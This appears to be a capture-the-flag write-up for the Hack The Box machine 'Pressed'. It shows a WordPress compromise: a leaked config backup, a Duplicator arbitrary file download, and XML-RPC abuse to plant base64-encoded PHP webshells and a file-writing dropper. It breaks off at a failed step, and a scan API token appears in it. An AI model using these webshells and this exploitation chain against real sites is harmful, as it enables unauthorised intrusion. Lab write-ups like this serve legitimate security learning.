# Attack Path

First enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oA nmap/pressed 10.129.136.28

result:
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: UHC Jan Finals &#8211; New Month, New Boxes
|_http-generator: WordPress 5.9

```

Let’s go visit the site. We got a domain. Let’s add that to /etc/hosts

Upon visiting, with webapplyzer, we see that the web is using wordpress 5.9 and our user-agent request is displayed on the page:

![image.png](/assets/pressed/image.png)

Maybe the site is vulnerable to SSTI (server-side template injection). First capture the GET request to index.php and change the user-agent:

```bash
#SSTI: https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti
User-Agent: ${{<%[%'"}}%\.

#Try other injections:
<?php echo('hello');?>

```

Since this is wordpress application, let’s enumerate all plugins and themes:

```bash
#First just enumerate wp with no options for quick result
sudo wpscan --url http://presse.htb

interesting result:
http://pressed.htb/wp-config.php.bak

#Then scan for more
sudo wpscan --url http://pressed.htb -e ap --plugins-detection aggressive  --api-token 2xkAZXNy4fEMFKyADzmPF2VTMDYb9qV3aUtDrDK5Zzs
```

The backup file revealed to us the DB admin password. Another way to find the back up file is to actively enumerate through gobuster:

```bash
echo 'wp-config.php' > wordlist
gobuster dir -u http://pressed.htb -w wordlist -d

result:
/wp-config.php        (Status: 200) [Size: 0]
/wp-config.php.bak    (Status: 200) [Size: 3194]
/.wp-config.php.swp   (Status: 200) [Size: 4096]
```

With the password, let’s attempt to login in wordpress by visiting wp-admin. It didn’t work but the real password is just a variation of the old one. However, we are met with two-factor authentication:

At the same time, wpscan has finally finished scanning:

We see that the duplicator plugin allows for unauthenticated file download. We can get the real wp-config.php as opposed to the backup, and download it to find the password. https://wpscan.com/vulnerability/35227c3a-e893-4c68-8cb6-ffe79115fb6d/ We can download any files we want. Let’s get passwd as well. From the file, searching for sh, we see that there is another user htb on the system other than root. Let’s see if we can exploit the xmlrpc. To test it visit https://otakunozoku.com/using-curl-to-debug-wordpress-xmlrpc-calls/, now try the call method

```bash
curl -d '<?xml version="1.0"?> <methodCall> <methodName>system.listMethods</methodName> </methodCall>' http://pressed.htb/xmlrpc.php
```

And we get a response back with all the methods. Let’s use a python tool to speed this up:

```bash
python3 -m venv myenv
source myenv/bin/activate
pip3 install python-wordpress-xmlrpc
```

With this, we can interact with the xmlrpc api where we can information about the posts on the webpage. This documentation tells us how to upload a file: https://python-wordpress-xmlrpc.readthedocs.io/en/latest/examples/media.html#uploading-a-file

```bash
python
from wordpress_xmlrpc import Client
import wordpress_xmlrpc.methods as wp
client = Client('http://pressed.htb/xmlrpc.php', username='admin', password='uhc-jan-finals-2022')
plist = client.call(wp.posts.GetPosts())
plist[0].content

result:
'<!-- wp:paragraph -->\n<p>The UHC January Finals are underway!  After this event, there are only three left until the season one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, seven of which are from Brazil and there is one lone Canadian.  Metrics for this event can be found below.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:php-everywhere-block/php {"code":"JTNDJTNGcGhwJTIwJTIwZWNobyhmaWxlX2dldF9jb250ZW50cygnJTJGdmFyJTJGd3d3JTJGaHRtbCUyRm91dHB1dC5sb2cnKSklM0IlMjAlM0YlM0U=","version":"3.0.0"} /-->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->'

The interesting part is the pph-everywhere-block. It seems to be a base64 body, let's decode that and see what that is

echo 'JTNDJTNGcGhwJTIwJTIwZWNobyhmaWxlX2dldF9jb250ZW50cygnJTJGdmFyJTJGd3d3JTJGaHRtbCUyRm91dHB1dC5sb2cnKSklM0IlMjAlM0YlM0U=' | base64 -d 

result:
It's also url encoded, let's use burp decode to see it better
```

![image.png](/assets/pressed/image%202.png)

It seems the website is using this code to generate the code of user agents. PHP Everywhere is a wordpress plugin that allows wordpress posts to run php. Because we have admin user’s credential, we can edit the post and create a webshell. Let’s modify the php:

```bash
<?php  echo(file_get_contents('/var/www/html/output.log')); if ($_SERVER['REMOTE_ADDR'] == '10.10.14.132'){system($_REQUEST['cmd']);}?>

#After base64 encoding:
PD9waHAgIGVjaG8oZmlsZV9nZXRfY29udGVudHMoJy92YXIvd3d3L2h0bWwvb3V0cHV0LmxvZycpKTsgaWYgKCRfU0VSVkVSWydSRU1PVEVfQUREUiddID09ICcxMC4xMC4xNC4xMzInKXtzeXN0ZW0oJF9SRVFVRVNUWydjbWQnXSk7fT8+
```

Now we have to edit the post on the page; changing the code part to our payload

```bash
mod_post = plist[0]
mod_post.content = '<!-- wp:paragraph -->\n<p>The UHC January Finals are underway!  After this event, there are only three left until the season one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, seven of which are from Brazil and there is one lone Canadian.  Metrics for this event can be found below.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:php-everywhere-block/php {"code":"PD9waHAgIGVjaG8oZmlsZV9nZXRfY29udGVudHMoJy92YXIvd3d3L2h0bWwvb3V0cHV0LmxvZycpKTsgaWYgKCRfU0VSVkVSWydSRU1PVEVfQUREUiddID09ICcxMC4xMC4xNC4xMzInKXtzeXN0ZW0oJF9SRVFVRVNUWydjbWQnXSk7fT8+","version":"3.0.0"} /-->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p></p>\n<!-- /wp:paragraph -->'
client.call(wp.posts.EditPost(mod_post.id, mod_post))
```

Now if we go back to the site and add the parameter cmd=id, we see our webshell is working:

![image.png](/assets/pressed/image%203.png)

Now we can try using a forward shell to get a real interactive shell. First clone the repo to host. Then edit the url to our webshell

```bash
Line 20: self.url = r"http://pressed.htb/index.php/2022/01/28/hello-world/"

Line 63: data = {'cmd': payload }

Line 65: r = requests.post(self.url, data=data, proxies=proxies, timeout=timeout)
```

Now we execute it. However, we get too much junk from the site. We could either create a new site without the html or edit the page again with no html. Again, use the payload we already created minus the log output and base64 encode it:

```bash
<?php system($_REQUEST['cmd']);?>

#base64 encode
PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsnY21kJ10pOz8+Cg==
```

Then put it in tht write php file function that we are going to put on the web page

```bash
<?php file_put_contents('shell2.php', base64_decode('PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsnY21kJ10pOz8+Cg==')); echo ("success"); ?>

#then base64 encode this so we can feed it to php everywhere like we did before
PD9waHAgZmlsZV9wdXRfY29udGVudHMoJ3NoZWxsMi5waHAnLCBiYXNlNjRfZGVjb2RlKCdQRDl3YUhBZ2MzbHpkR1Z0S0NSZlVrVlJWVVZUVkZzblkyMWtKMTBwT3o4K0NnPT0nKSk7IGVjaG8gKCJzdWNjZXNzIik7ID8+Cg==
```

Now modify the post again:

```bash
mod_post.content = '<!-- wp:paragraph -->\n<p>The UHC January Finals are underway!  After this event, there are only three left until the season one finals in which all the previous winners will compete in the Tournament of Champions.

client.call(wp.posts.EditPost(mod_post.id, mod_post))

p = client.call(wp.posts.GetPosts())[0]
client.call(wp.posts.NewPost(p))
p.content = '<!-- wp:paragraph -->\n<p>The UHC January Finals are underway!  After this event, there are only three left until the season one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, seven of which are from Brazil and there is one lone Canadian.

client.call(wp.posts.NewPost(p))
```

Does not work… Looking at burp we get a 500 internal server error.
